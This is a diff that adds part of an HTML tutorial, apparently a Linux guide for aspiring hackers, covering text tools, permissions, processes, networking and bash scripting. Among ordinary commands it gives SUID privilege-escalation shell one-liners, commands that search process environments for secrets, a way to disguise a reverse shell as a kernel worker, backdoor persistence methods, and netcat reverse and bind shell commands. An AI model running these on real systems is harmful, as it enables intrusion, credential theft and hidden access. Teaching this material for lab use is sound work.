+grep -r "API_KEY" /opt/                # Find API keys
+grep "Failed password" /var/log/auth.log  # Failed login attempts
+
+# ==================== SED - Stream Editor (Find & Replace) ====================
+
+sed 's/old/new/' file.txt              # Replace first occurrence per line
+sed 's/old/new/g' file.txt             # Replace ALL occurrences (global)
+sed -i 's/old/new/g' file.txt          # Edit file in place
+sed -i.bak 's/old/new/g' file.txt      # In place with backup
+
+sed '/pattern/d' file.txt              # Delete lines matching pattern
+sed '5d' file.txt                      # Delete line 5
+sed '5,10d' file.txt                   # Delete lines 5-10
+sed -n '5,10p' file.txt                # Print only lines 5-10
+
+sed 's/^/PREFIX /' file.txt            # Add prefix to all lines
+sed 's/$/ SUFFIX/' file.txt            # Add suffix to all lines
+
+# ==================== AWK - Pattern Processing (Powerful!) ====================
+
+awk '{print $1}' file.txt              # Print first column (space-delimited)
+awk '{print $1, $3}' file.txt          # Print columns 1 and 3
+awk -F: '{print $1}' /etc/passwd       # Use : as delimiter (get usernames)
+awk -F: '{print $1,$3}' /etc/passwd    # Username and UID
+
+awk '/pattern/ {print}' file.txt       # Print lines matching pattern
+awk '$3 > 100 {print}' file.txt        # Print if column 3 > 100
+awk '{sum += $1} END {print sum}'      # Sum first column
+
+# Practical: Get all usernames from passwd
+awk -F: '{print $1}' /etc/passwd
+
+# Practical: Get all users who can login (have /bin/bash)
+awk -F: '$7 ~ /bash/ {print $1}' /etc/passwd
+
+# ==================== CUT - Extract Columns ====================
+
+cut -d: -f1 /etc/passwd                # Get first field, delimiter :
+cut -d: -f1,3 /etc/passwd              # Get fields 1 and 3
+cut -d: -f1-3 /etc/passwd              # Get fields 1 through 3
+cut -c1-10 file.txt                    # Get characters 1-10
+
+# ==================== SORT & UNIQ - Organize Data ====================
+
+sort file.txt                          # Sort alphabetically
+sort -n file.txt                       # Sort numerically
+sort -r file.txt                       # Reverse sort
+sort -u file.txt                       # Sort and remove duplicates
+sort -t: -k3 -n /etc/passwd            # Sort by field 3 (UID)
+
+uniq file.txt                          # Remove adjacent duplicates
+uniq -c file.txt                       # Count occurrences
+sort file.txt | uniq -c | sort -rn     # Count & sort by frequency
+
+# ==================== TR - Translate Characters ====================
+
+tr 'a-z' 'A-Z' < file.txt              # Convert to uppercase
+tr '[:lower:]' '[:upper:]' < file.txt  # Same thing
+tr -d '[:digit:]' < file.txt           # Delete all digits
+tr '\0' '\n' < /proc/1/environ         # Replace null bytes with newlines</div>
+
+            <h3>Piping and Redirection - Combining Power</h3>
+            <div class="code"># ==================== PIPES (|) - Chain Commands ====================
+
+# Output of command 1 becomes input of command 2
+cat /etc/passwd | grep "bash"          # Find bash users
+ps aux | grep "apache"                 # Find Apache processes
+ls -la | head -20                      # First 20 lines of listing
+history | grep "ssh"                   # Find SSH commands in history
+netstat -tuln | grep "LISTEN"          # Find listening ports
+
+# Multiple pipes:
+cat access.log | grep "404" | awk '{print $1}' | sort | uniq -c | sort -rn
+# Find all 404 errors → get IP → sort → count → sort by frequency
+
+# ==================== OUTPUT REDIRECTION (>) ====================
+
+echo "hello" > file.txt                # Write to file (OVERWRITES!)
+echo "more" >> file.txt                # Append to file
+ls -la > listing.txt                   # Save output to file
+cat file1 file2 > combined.txt         # Combine files
+
+# ==================== INPUT REDIRECTION (<) ====================
+
+mysql < script.sql                     # Feed file to command
+sort < unsorted.txt > sorted.txt       # Input from file, output to file
+
+# ==================== ERROR REDIRECTION (2>) ====================
+
+command 2> errors.log                  # Errors to file, output to screen
+command 2>/dev/null                    # Discard errors (silent fails)
+command > output.txt 2>&1              # Both stdout and stderr to file
+command &> output.txt                  # Same thing (shorthand)
+
+# Practical: Suppress permission denied errors
+find / -name "secret" 2>/dev/null
+
+# ==================== TEE - Output to Both ====================
+
+command | tee output.txt               # Display AND save to file
+command | tee -a output.txt            # Display AND append to file
+
+# ==================== HERE DOCUMENTS ====================
+
+cat << EOF > script.sh
+#!/bin/bash
+echo "This is a script"
+echo "Created inline"
+EOF</div>
+        </section>
+
+        <section id="permissions" class="section">
+            <h2 class="section-title">Linux Permissions: The Security Foundation</h2>
+            <p class="section-intro">Permissions are the CORE of Linux security. Every file, every directory, every device has permissions that control who can read, write, or execute it. Understanding permissions deeply is essential for both defending and attacking systems. Every privilege escalation exploit ultimately targets permission weaknesses.</p>
+
+            <div class="metaphor-box">
+                <h4>🔐 The Office Building Metaphor</h4>
+                <p>Think of a Linux system like an office building:</p>
+                <ul style="margin-top: 1rem;">
+                    <li><strong>Owner:</strong> The person whose name is on the office door - full control</li>
+                    <li><strong>Group:</strong> People in the same department - shared access to department resources</li>
+                    <li><strong>Others:</strong> Everyone else in the building - limited to public areas</li>
+                </ul>
+                <p style="margin-top: 1rem;">Each file is like a document with three access lists: what the owner can do, what the department can do, and what everyone else can do.</p>
+            </div>
+
+            <h3>Reading Permission Strings</h3>
+            <div class="code">$ ls -la
+drwxr-x--- 2 hacker users   4096 Dec 14 09:00 private/
+-rwxr-xr-x 1 root   root   12345 Dec 14 10:00 script.sh
+-rw-r--r-- 1 hacker hacker   182 Dec 14 09:30 notes.txt
+lrwxrwxrwx 1 root   root      11 Dec 14 08:00 link -> /etc/passwd
+
+# Breaking down: -rwxr-xr-x
+
+# Position 1: File type
+# -  = Regular file
+# d  = Directory
+# l  = Symbolic link
+# c  = Character device
+# b  = Block device
+# s  = Socket
+# p  = Named pipe
+
+# Position 2-4: OWNER permissions
+# rwx = Read (4), Write (2), eXecute (1)
+# The file owner can read, write, and execute
+
+# Position 5-7: GROUP permissions
+# r-x = Read and execute, no write
+# Members of the group can read and run, but not modify
+
+# Position 8-10: OTHERS permissions
+# r-x = Read and execute, no write
+# Everyone else can read and run, but not modify</div>
+
+            <h3>Numeric (Octal) Permissions</h3>
+            <div class="code"># Each permission has a numeric value:
+# r = 4  (read)
+# w = 2  (write)
+# x = 1  (execute)
+
+# Add them up for each category:
+# rwx = 4+2+1 = 7 (full access)
+# rw- = 4+2+0 = 6 (read/write)
+# r-x = 4+0+1 = 5 (read/execute)
+# r-- = 4+0+0 = 4 (read only)
+# --- = 0+0+0 = 0 (no access)
+
+# Three digits: Owner, Group, Others
+
+# Common permission sets:
+# 777 = rwxrwxrwx = Everyone can do everything (DANGEROUS!)
+# 755 = rwxr-xr-x = Owner full, others read/execute (executables)
+# 750 = rwxr-x--- = Owner full, group read/execute, others nothing
+# 700 = rwx------ = Only owner can access (private!)
+# 644 = rw-r--r-- = Owner read/write, others read only (documents)
+# 640 = rw-r----- = Owner read/write, group read (sensitive docs)
+# 600 = rw------- = Only owner can read/write (secrets!)
+# 400 = r-------- = Only owner can read (SSH keys!)</div>
+
+            <h3>Permissions on Directories</h3>
+            <div class="code"># Permissions mean different things for directories!
+
+# r (read) on directory:
+# - Can list contents (ls works)
+# - Without this, you can't see what's inside
+
+# w (write) on directory:
+# - Can create, delete, rename files inside
+# - Even files you don't own! (if you have dir write)
+
+# x (execute) on directory:
+# - Can enter the directory (cd works)
+# - Can access files inside IF you know the name
+# - Without x, directory is completely inaccessible
+
+# Common directory permissions:
+# 755 = Owner full, others can browse
+# 750 = Owner full, group can browse, others blocked
+# 700 = Only owner can access (private directory)
+# 1777 = Sticky bit (see below) - for /tmp</div>
+
+            <h3>Changing Permissions</h3>
+            <div class="code"># ==================== CHMOD - Change Mode ====================
+
+# Numeric method (recommended):
+chmod 755 script.sh                # rwxr-xr-x
+chmod 600 secret.txt               # rw-------
+chmod 777 folder/                  # rwxrwxrwx (AVOID!)
+
+# Symbolic method:
+chmod +x script.sh                 # Add execute for all
+chmod u+x script.sh                # Add execute for user/owner only
+chmod g+w file.txt                 # Add write for group
+chmod o-rwx secret.txt             # Remove all permissions for others
+chmod go-rwx private.txt           # Remove all for group AND others
+chmod a+r public.txt               # Add read for all (a = all)
+
+chmod u=rwx,g=rx,o=r file          # Set specific permissions
+
+# Recursive:
+chmod -R 755 folder/               # Apply to folder and all contents
+
+# ==================== CHOWN - Change Owner ====================
+
+chown hacker file.txt              # Change owner to hacker
+chown hacker:users file.txt        # Change owner AND group
+chown :users file.txt              # Change only group
+chown -R hacker folder/            # Recursive change
+
+# ==================== CHGRP - Change Group ====================
+
+chgrp users file.txt               # Change group
+chgrp -R users folder/             # Recursive</div>
+
+            <h3>Special Permissions - Where Exploits Live!</h3>
+
+            <div class="warning-box">
+                <h4>🎯 SUID/SGID - Privilege Escalation Goldmine</h4>
+                <p><strong>SUID (Set User ID)</strong> makes a program run as the FILE OWNER, not the user running it. If root owns a SUID binary with a vulnerability, a regular user can exploit it to become root!</p>
+                <p style="margin-top: 1rem;"><strong>SGID (Set Group ID)</strong> makes a program run with the file's GROUP permissions.</p>
+            </div>
+
+            <div class="code"># ==================== SUID (Set User ID) ====================
+
+# When SUID is set, the program runs as the FILE OWNER
+# This is how regular users can run passwd to change their password
+# /usr/bin/passwd is owned by root but runs with SUID
+
+$ ls -la /usr/bin/passwd
+-rwsr-xr-x 1 root root 68208 Jan 1 2024 /usr/bin/passwd
+#   ^
+#   The 's' instead of 'x' means SUID is set
+
+# When you run passwd, it runs AS ROOT, even though you're not root
+# This lets it modify /etc/shadow (which only root can write)
+
+# Set SUID:
+chmod u+s program                  # Symbolic
+chmod 4755 program                 # Numeric (4 = SUID)
+
+# ==================== FINDING SUID BINARIES - CRITICAL FOR PRIVESC! ====================
+
+find / -perm -4000 -type f 2>/dev/null     # Find ALL SUID files
+
+# Common SUID binaries that can be exploited:
+# /usr/bin/find      - Can execute commands!
+# /usr/bin/vim       - Can spawn shell!
+# /usr/bin/python    - Obvious...
+# /usr/bin/nmap      - Interactive mode gives shell
+# /usr/bin/less      - !sh spawns shell
+# /usr/bin/awk       - Can execute system commands
+# /usr/bin/cp        - Can overwrite sensitive files
+
+# ==================== EXPLOITING SUID BINARIES ====================
+
+# Example 1: find with SUID (owned by root)
+find . -exec /bin/sh -p \;         # -p preserves privileges
+
+# Example 2: vim with SUID
+vim -c '!sh'                       # Spawn shell from vim
+
+# Example 3: python with SUID
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+# Example 4: awk with SUID
+awk 'BEGIN {system("/bin/sh")}'
+
+# Example 5: less with SUID
+less /etc/passwd
+!sh                                # Type this inside less
+
+# GTFOBins.github.io - Database of SUID exploitation techniques!
+
+# ==================== SGID (Set Group ID) ====================
+
+# Similar to SUID but for group permissions
+# Shown as 's' in group execute position
+
+$ ls -la /usr/bin/wall
+-rwxr-sr-x 1 root tty 19024 Jan 1 2024 /usr/bin/wall
+#       ^
+#       SGID bit set
+
+# Find SGID binaries:
+find / -perm -2000 -type f 2>/dev/null
+
+# ==================== STICKY BIT ====================
+
+# When set on a directory, only file owner can delete their files
+# Used on /tmp to prevent users from deleting each other's files
+
+$ ls -la /tmp
+drwxrwxrwt 15 root root 4096 Dec 14 10:00 /tmp
+#        ^
+#        The 't' means sticky bit
+
+# Set sticky bit:
+chmod +t directory
+chmod 1777 directory               # 1 = sticky bit</div>
+
+            <h3>Understanding umask</h3>
+            <div class="code"># umask determines DEFAULT permissions for new files
+
+# Current umask:
+$ umask
+0022
+
+# umask is SUBTRACTED from full permissions:
+# Full file permissions:  666 (rw-rw-rw-)
+# Minus umask:           -022
+# Result:                 644 (rw-r--r--)
+
+# Full directory permissions: 777 (rwxrwxrwx)
+# Minus umask:               -022
+# Result:                     755 (rwxr-xr-x)
+
+# Common umask values:
+# 022 = Default: owner full, group/others read
+# 027 = More private: others get nothing
+# 077 = Private: only owner can access
+
+# Set umask (for this session):
+umask 027
+
+# Make permanent in ~/.bashrc</div>
+
+            <div class="info-box">
+                <h4>Key Permission Attack Vectors</h4>
+                <ul style="margin-top: 1rem;">
+                    <li><strong>SUID binaries:</strong> If exploitable, instant root</li>
+                    <li><strong>World-writable files:</strong> Can modify configs, scripts</li>
+                    <li><strong>World-writable directories:</strong> Can create files for exploitation</li>
+                    <li><strong>Writable cron scripts:</strong> Code runs on schedule as owner</li>
+                    <li><strong>Writable service configs:</strong> Restart service = exploit triggered</li>
+                    <li><strong>Weak sudo configurations:</strong> Run commands as root</li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="processes" class="section">
+            <h2 class="section-title">Process Management: Understanding Running Programs</h2>
+            <p class="section-intro">Processes are running programs. Every command you type, every service running, every malware sample - they're all processes. Understanding how to view, control, and manipulate them is essential for system administration, maintaining persistence, hiding your presence, and post-exploitation activities.</p>
+
+            <div class="metaphor-box">
+                <h4>🏭 The Factory Metaphor</h4>
+                <p>Think of your Linux system as a factory:</p>
+                <ul style="margin-top: 1rem;">
+                    <li><strong>The kernel:</strong> Factory manager, coordinates everything</li>
+                    <li><strong>Processes:</strong> Workers on the factory floor, each doing a job</li>
+                    <li><strong>PID:</strong> Employee ID number (unique identifier)</li>
+                    <li><strong>Parent process:</strong> The supervisor who hired the worker</li>
+                    <li><strong>Child process:</strong> Workers hired by other workers</li>
+                    <li><strong>CPU time:</strong> How much work each employee does</li>
+                    <li><strong>Memory:</strong> How much desk space each worker needs</li>
+                </ul>
+            </div>
+
+            <h3>Viewing Processes</h3>
+            <div class="code"># ==================== PS - Process Status ====================
+
+ps                     # Your processes only (current terminal)
+ps aux                 # ALL processes on the system, detailed
+ps -ef                 # Another format (shows parent PIDs)
+ps aux | grep apache   # Find specific process
+
+# Understanding ps aux output:
+# USER  PID %CPU %MEM    VSZ   RSS TTY   STAT START   TIME COMMAND
+# root    1  0.0  0.1 225152  9532 ?     Ss   Dec13   0:06 /sbin/init
+# www-data 842 0.5 2.3 1234567 23456 ?   S    Dec13   1:24 /usr/sbin/apache2
+
+# Column meanings:
+# USER   = Owner of the process
+# PID    = Process ID (unique identifier)
+# %CPU   = CPU usage percentage
+# %MEM   = Memory usage percentage
+# VSZ    = Virtual memory size
+# RSS    = Resident Set Size (actual RAM used)
+# TTY    = Terminal (? means no terminal / daemon)
+# STAT   = Process state (see below)
+# START  = When process started
+# TIME   = Cumulative CPU time
+# COMMAND = Command that started the process
+
+# Process states (STAT column):
+# R = Running or runnable
+# S = Sleeping (waiting for event)
+# D = Uninterruptible sleep (usually I/O)
+# Z = Zombie (finished but not cleaned up)
+# T = Stopped (suspended)
+# s = Session leader
+# + = Foreground process
+
+# ==================== TOP - Live Process Viewer ====================
+
+top                    # Interactive process viewer
+# Press q to quit
+# Press h for help
+# Press k to kill a process
+# Press M to sort by memory
+# Press P to sort by CPU
+# Press u then username to filter by user
+
+htop                   # Better version (install: apt install htop)
+# More colorful, easier navigation
+# Arrow keys to move, F9 to kill, F10 to quit
+
+# ==================== OTHER PROCESS VIEWING ====================
+
+pstree                 # Show process hierarchy
+pstree -p              # Include PIDs
+pgrep apache           # Get PIDs of apache processes
+pidof sshd             # Get PID of specific command</div>
+
+            <h3>Controlling Processes</h3>
+            <div class="code"># ==================== STARTING PROCESSES ====================
+
+./program              # Run in foreground (blocks terminal)
+./program &            # Run in background (terminal free)
+nohup ./program &      # Run AND survive logout
+nohup ./program > output.log 2>&1 &  # With output capture
+
+# Using screen/tmux for persistent sessions:
+screen                 # Start new screen session
+screen -S hacking      # Named session
+screen -ls             # List sessions
+screen -r hacking      # Reattach to session
+# Ctrl+A, D = Detach (leave running)
+
+tmux                   # Similar to screen (more modern)
+tmux new -s work       # New named session
+tmux ls                # List sessions
+tmux attach -t work    # Reattach
+
+# ==================== STOPPING PROCESSES ====================
+
+Ctrl+C                 # Interrupt foreground process (SIGINT)
+Ctrl+\                 # Quit foreground process (SIGQUIT)
+Ctrl+Z                 # Suspend foreground process (SIGTSTP)
+
+kill PID               # Send SIGTERM (polite request to stop)
+kill -9 PID            # Send SIGKILL (force kill, cannot be caught)
+kill -STOP PID         # Pause process
+kill -CONT PID         # Resume paused process
+
+killall apache2        # Kill all processes named apache2
+pkill -f "python"      # Kill processes matching pattern
+pkill -u hacker        # Kill all processes owned by hacker
+
+# ==================== BACKGROUND/FOREGROUND ====================
+
+Ctrl+Z                 # Suspend current foreground process
+bg                     # Resume suspended process in background
+fg                     # Bring background process to foreground
+fg %2                  # Bring job #2 to foreground
+jobs                   # List background jobs
+jobs -l                # Include PIDs
+
+# Example workflow:
+$ ./long_script.sh
+# Realize it's taking forever...
+^Z                     # Ctrl+Z to suspend
+[1]+  Stopped         ./long_script.sh
+$ bg                   # Resume in background
+[1]+ ./long_script.sh &
+$ # Terminal is free now!
+
+# ==================== SIGNALS ====================
+
+# Signals are messages sent to processes
+kill -l                # List all signals
+
+# Important signals:
+# 1  SIGHUP  - Hangup (reload config)
+# 2  SIGINT  - Interrupt (Ctrl+C)
+# 9  SIGKILL - Kill (cannot be caught or ignored)
+# 15 SIGTERM - Terminate (default, polite)
+# 19 SIGSTOP - Stop (cannot be caught)
+# 18 SIGCONT - Continue
+
+kill -HUP PID          # Send hangup (often reloads config)
+kill -TERM PID         # Send terminate
+kill -KILL PID         # Force kill (last resort)</div>
+
+            <h3>Process Information for Hackers</h3>
+            <div class="code"># ==================== /PROC FILESYSTEM ====================
+
+ls /proc/              # Each number is a PID directory
+ls /proc/1234/         # Information about PID 1234
+
+# Useful files in /proc/PID/:
+cat /proc/1234/cmdline    # Command that started it
+cat /proc/1234/environ    # Environment variables (SECRETS!)
+cat /proc/1234/cwd        # Current working directory (symlink)
+cat /proc/1234/exe        # Path to executable (symlink)
+cat /proc/1234/maps       # Memory map (for exploitation)
+cat /proc/1234/fd/        # Open file descriptors
+cat /proc/1234/status     # Process status (UID, GID, memory)
+
+# Practical: Find secrets in environment variables
+strings /proc/*/environ 2>/dev/null | grep -i password
+strings /proc/*/environ 2>/dev/null | grep -i key
+strings /proc/*/environ 2>/dev/null | grep -i secret
+
+# ==================== HIDING YOUR PROCESSES ====================
+
+# Bad: Visible in ps
+./reverse_shell.sh &
+
+# Better: Rename to look legitimate
+cp reverse_shell.sh "[kworker/0:1]"   # Looks like kernel worker
+./[kworker/0:1] &
+
+# Better: Use exec to replace process
+exec -a "[kworker/0:1]" ./reverse_shell.sh
+
+# Check what others are running:
+ps aux | grep -v "^\["    # Exclude kernel threads</div>
+
+            <div class="info-box">
+                <h4>Process Persistence Techniques</h4>
+                <p>Keep your access alive even if your process dies:</p>
+                <ul style="margin-top: 1rem;">
+                    <li><strong>Cron jobs:</strong> Schedule your backdoor to run periodically</li>
+                    <li><strong>systemd service:</strong> Create a service that auto-restarts</li>
+                    <li><strong>rc.local:</strong> Add to startup scripts</li>
+                    <li><strong>~/.bashrc:</strong> Execute when user logs in</li>
+                    <li><strong>SSH authorized_keys:</strong> Add your SSH key for persistent access</li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="networking" class="section">
+            <h2 class="section-title">Linux Networking: Connecting and Attacking</h2>
+            <p class="section-intro">Network commands are essential for reconnaissance, attacking, and maintaining access. As a hacker, you'll spend more time with these commands than almost any others. From enumerating targets to establishing reverse shells, these are your bread and butter for offensive operations.</p>
+
+            <div class="metaphor-box">
+                <h4>🌐 The Network as a Map</h4>
+                <p>Think of network reconnaissance like mapping enemy territory:</p>
+                <ul style="margin-top: 1rem;">
+                    <li><strong>ip a:</strong> Checking your own location on the map</li>
+                    <li><strong>ping:</strong> Shouting to see if anyone responds</li>
+                    <li><strong>nmap:</strong> Sending scouts to find all doors and windows</li>
+                    <li><strong>netstat:</strong> Seeing who's currently visiting your location</li>
+                    <li><strong>tcpdump:</strong> Setting up listening posts to hear all conversations</li>
+                    <li><strong>ssh:</strong> A secure tunnel to enemy territory</li>
+                </ul>
+            </div>
+
+            <h3>Network Interface Information</h3>
+            <div class="code"># ==================== IP ADDRESSES AND INTERFACES ====================
+
+ip a                        # All interfaces and IPs (modern)
+ip addr show eth0           # Specific interface details
+ip -c a                     # Colorized output
+ifconfig                    # Old command, still works
+ifconfig eth0               # Specific interface
+
+# Understanding output:
+# inet 192.168.1.100/24     = IPv4 address with subnet mask
+# inet6 fe80::1/64          = IPv6 address
+# ether 00:11:22:33:44:55   = MAC address
+# UP BROADCAST RUNNING      = Interface is active
+
+# Change interface settings (requires root)
+ip link set eth0 down           # Disable interface
+ip link set eth0 up             # Enable interface
+ip addr add 192.168.1.50/24 dev eth0    # Add IP address
+ip addr del 192.168.1.50/24 dev eth0    # Remove IP address
+
+# MAC address spoofing
+ip link set eth0 down
+ip link set eth0 address 00:11:22:33:44:55
+ip link set eth0 up
+# Or use macchanger:
+macchanger -r eth0              # Random MAC
+macchanger -m 00:11:22:33:44:55 eth0  # Specific MAC
+
+# ==================== ROUTING ====================
+
+ip route                    # Show routing table (modern)
+ip route show               # Same thing
+route -n                    # Old format, numeric
+netstat -rn                 # Another way
+
+# Default gateway (how to reach the internet)
+ip route | grep default
+# default via 192.168.1.1 dev eth0 proto dhcp
+
+# Add routes
+ip route add 10.0.0.0/8 via 192.168.1.1    # Route network via gateway
+ip route add default via 192.168.1.1        # Set default gateway
+ip route del 10.0.0.0/8                     # Remove route</div>
+
+            <h3>DNS and Name Resolution</h3>
+            <div class="code"># ==================== DNS CONFIGURATION ====================
+
+cat /etc/resolv.conf        # DNS server configuration
+cat /etc/hosts              # Local hostname mappings
+
+# ==================== DNS LOOKUP TOOLS ====================
+
+nslookup google.com         # Simple lookup
+nslookup -type=MX gmail.com # Mail servers
+nslookup -type=NS google.com # Name servers
+
+dig google.com              # Detailed DNS lookup
+dig +short google.com       # Just the IP
+dig @8.8.8.8 google.com     # Use specific DNS server
+dig ANY google.com          # All record types
+dig -x 8.8.8.8              # Reverse lookup (IP to name)
+
+host google.com             # Simple lookup
+host -t MX gmail.com        # Mail servers
+
+# DNS enumeration for hacking
+dig axfr @ns1.target.com target.com   # Zone transfer (if allowed!)
+dnsrecon -d target.com                 # DNS enumeration
+dnsenum target.com                     # Another DNS enum tool
+fierce -dns target.com                 # DNS bruteforce</div>
+
+            <h3>Connection and Port Information</h3>
+            <div class="code"># ==================== VIEWING CONNECTIONS ====================
+
+# netstat - classic but being replaced by ss
+netstat -tuln              # Listening ports (TCP/UDP, numeric)
+netstat -tupn              # All connections with PIDs
+netstat -an                # All sockets, numeric
+
+# ss - modern replacement for netstat (faster)
+ss -tuln                   # Listening ports
+ss -tupn                   # All connections with PIDs
+ss -s                      # Socket statistics
+ss state established       # Only established connections
+
+# Understanding the output:
+# Proto Local Address      Foreign Address    State       PID/Program
+# tcp   0.0.0.0:22         0.0.0.0:*          LISTEN      1234/sshd
+# tcp   192.168.1.5:22     192.168.1.100:45678 ESTABLISHED 5678/sshd
+
+# States explained:
+# LISTEN     = Waiting for connections
+# ESTABLISHED = Active connection
+# TIME_WAIT  = Waiting after close
+# CLOSE_WAIT = Remote closed, waiting for local close
+
+# ==================== LSOF - LIST OPEN FILES ====================
+
+lsof -i                    # All network files
+lsof -i :22                # What's using port 22
+lsof -i @192.168.1.100     # Connections to specific IP
+lsof -i tcp                # All TCP connections
+lsof -u root -i            # Network files by root
+
+# Practical: Find hidden listeners
+netstat -tuln | grep LISTEN
+ss -tuln | grep LISTEN
+lsof -i -P | grep LISTEN</div>
+
+            <h3>Network Recon Tools</h3>
+            <div class="code"># ==================== PING AND CONNECTIVITY ====================
+
+ping 8.8.8.8               # Test connectivity (ICMP)
+ping -c 4 google.com       # Only 4 pings
+ping -i 0.2 target         # Fast ping (0.2 sec interval)
+
+# Ping sweep (find alive hosts)
+for i in $(seq 1 254); do
+    ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo "192.168.1.$i is up" &
+done; wait
+
+# Or use fping (faster)
+fping -a -g 192.168.1.0/24 2>/dev/null
+
+# ==================== TRACEROUTE ====================
+
+traceroute google.com      # Trace network path
+traceroute -n google.com   # Numeric (no DNS lookup)
+traceroute -T google.com   # TCP instead of UDP
+mtr google.com             # Continuous traceroute (interactive)
+
+# ==================== NMAP - THE KING OF SCANNERS ====================
+
+# Host discovery
+nmap -sn 192.168.1.0/24           # Ping sweep (no port scan)
+nmap -Pn target                    # Skip ping, assume host is up
+
+# Port scanning
+nmap target                        # Default (top 1000 ports)
+nmap -p 22,80,443 target          # Specific ports
+nmap -p- target                    # All 65535 ports
+nmap -p 1-1000 target             # Port range
+nmap --top-ports 100 target       # Top 100 ports
+
+# Scan types
+nmap -sT target                    # TCP connect (full handshake)
+nmap -sS target                    # SYN scan (stealth, needs root)
+nmap -sU target                    # UDP scan (slow!)
+nmap -sV target                    # Version detection
+nmap -sC target                    # Default scripts
+nmap -O target                     # OS detection
+
+# Combined scans
+nmap -sV -sC -O target             # Version + scripts + OS
+nmap -A target                     # Aggressive (all of above)
+nmap -sS -sV -sC -p- -T4 target   # Comprehensive scan
+
+# Output formats
+nmap -oN output.txt target         # Normal output
+nmap -oX output.xml target         # XML output
+nmap -oG output.gnmap target       # Grepable output
+nmap -oA output target             # All formats
+
+# Scripting engine (NSE)
+nmap --script vuln target          # Vulnerability scripts
+nmap --script http-* target        # All HTTP scripts
+nmap --script smb-vuln* target     # SMB vulnerabilities</div>
+
+            <h3>Data Transfer and Remote Access</h3>
+            <div class="code"># ==================== CURL - SWISS ARMY KNIFE ====================
+
+curl http://example.com              # Fetch page
+curl -o file.html http://example.com # Save to file
+curl -O http://example.com/file.zip  # Save with original name
+curl -I http://example.com           # Headers only
+curl -v http://example.com           # Verbose (see headers)
+curl -X POST -d "data=value" URL     # POST request
+curl -u user:pass http://example.com # Basic auth
+curl -k https://example.com          # Ignore SSL errors
+curl -L http://example.com           # Follow redirects
+curl -b "cookie=value" http://example.com  # Send cookies
+
+# ==================== WGET - DOWNLOAD MANAGER ====================
+
+wget http://example.com/file.zip    # Download file
+wget -O newname.zip URL             # Save with different name
+wget -c URL                         # Continue interrupted download
+wget -r http://example.com          # Recursive download (mirror)
+wget -q URL                         # Quiet mode
+wget --spider URL                   # Just check if exists
+
+# ==================== SECURE COPY (SCP) ====================
+
+scp file.txt user@host:/path/       # Upload file
+scp user@host:/path/file.txt ./     # Download file
+scp -r folder/ user@host:/path/     # Copy directory
+scp -P 2222 file.txt user@host:/    # Custom SSH port
+
+# ==================== SSH - SECURE SHELL ====================
+
+ssh user@host                       # Connect
+ssh -p 2222 user@host               # Custom port
+ssh -i key.pem user@host            # Use private key
+
+# SSH port forwarding (CRUCIAL for hacking!)
+
+# Local port forward: Access remote service through local port
+ssh -L 8080:localhost:80 user@host
+# Now http://localhost:8080 goes to host's port 80
+
+# Remote port forward: Expose local service to remote host
+ssh -R 9999:localhost:22 user@host
+# Now host can ssh to localhost:9999 to reach your machine
+
+# Dynamic (SOCKS proxy)
+ssh -D 9050 user@host
+# Now configure browser/tools to use SOCKS proxy on 9050
+
+# SSH through jump host
+ssh -J jumphost user@target
+
+# ==================== NETCAT - THE HACKER'S FRIEND ====================
+
+# Connect to port
+nc host 80                          # Connect to host:80
+echo "GET /" | nc host 80           # Send HTTP request
+
+# Listen on port
+nc -lvnp 4444                       # Listen on port 4444
+
+# Transfer files
+nc -lvnp 4444 > received.txt        # Receiver
+nc host 4444 < file.txt             # Sender
+
+# Reverse shell (classic)
+nc -e /bin/bash attacker 4444       # On target (if nc has -e)
+nc -lvnp 4444                       # On attacker
+
+# Bind shell
+nc -lvnp 4444 -e /bin/bash          # On target (if nc has -e)
+nc target 4444                      # On attacker</div>
+
+            <h3>Packet Capture and Analysis</h3>
+            <div class="code"># ==================== TCPDUMP - COMMAND LINE SNIFFER ====================
+
+tcpdump                             # Capture all traffic
+tcpdump -i eth0                     # Specific interface
+tcpdump -n                          # No DNS resolution (faster)
+tcpdump -v                          # Verbose
+tcpdump -X                          # Show packet contents in hex/ASCII
+
+# Filters
+tcpdump host 192.168.1.100          # Traffic to/from host
+tcpdump src 192.168.1.100           # Only from this host
+tcpdump dst 192.168.1.100           # Only to this host
+tcpdump port 80                     # HTTP traffic
+tcpdump "port 80 or port 443"       # HTTP or HTTPS
+tcpdump tcp                         # Only TCP
+tcpdump icmp                        # Only ICMP (ping)
+
+# Save to file
+tcpdump -w capture.pcap             # Write to file
+tcpdump -r capture.pcap             # Read from file
+
+# Practical captures
+tcpdump -i eth0 port 80 -A          # See HTTP content
+tcpdump -i eth0 'tcp[13] & 2 != 0'  # SYN packets only
+
+# ==================== WIRESHARK (GRAPHICAL) ====================
+
+wireshark                           # GUI packet analyzer
+tshark                              # Command-line Wireshark
+tshark -i eth0 -f "port 80"         # Capture HTTP</div>
+
+            <div class="warning-box">
+                <h4>⚠️ Legal Warning</h4>
+                <p>Network scanning and packet capture on networks you don't own or have explicit permission to test is <strong>illegal</strong> in most jurisdictions. Always:</p>
+                <ul style="margin-top: 1rem;">
+                    <li>Get written permission before scanning</li>
+                    <li>Use only in authorized lab environments</li>
+                    <li>Understand your local laws</li>
+                    <li>Document your authorization</li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="scripting" class="section">
+            <h2 class="section-title">Bash Scripting: Automation for Hackers</h2>
+            <p class="section-intro">Scripts automate repetitive tasks and amplify your capabilities. Whether it's reconnaissance, exploitation, post-exploitation, or data exfiltration, scripting turns hours of manual work into seconds of automated execution. This is where you go from "user" to "power user" to "dangerous adversary."</p>
+
+            <div class="metaphor-box">
+                <h4>🤖 The Automation Multiplier</h4>
+                <p>Think of scripts as having a clone army:</p>
+                <ul style="margin-top: 1rem;">
+                    <li><strong>Manual:</strong> You ping 254 hosts, one at a time, taking 30 minutes</li>
+                    <li><strong>Script:</strong> Your script pings all 254 hosts in parallel, taking 10 seconds</li>
+                    <li><strong>Manual:</strong> You check 100 passwords against a login form, taking hours</li>
+                    <li><strong>Script:</strong> Your script checks 10,000 passwords in minutes</li>
+                </ul>
+                <p style="margin-top: 1rem; color: var(--accent);">Scripts don't get tired, don't make typos, and never need coffee breaks.</p>
+            </div>
+
+            <h3>Script Basics and Structure</h3>
+            <div class="code">#!/bin/bash
+# ==================== THE SHEBANG ====================
+# The first line (#!/bin/bash) tells Linux which interpreter to use
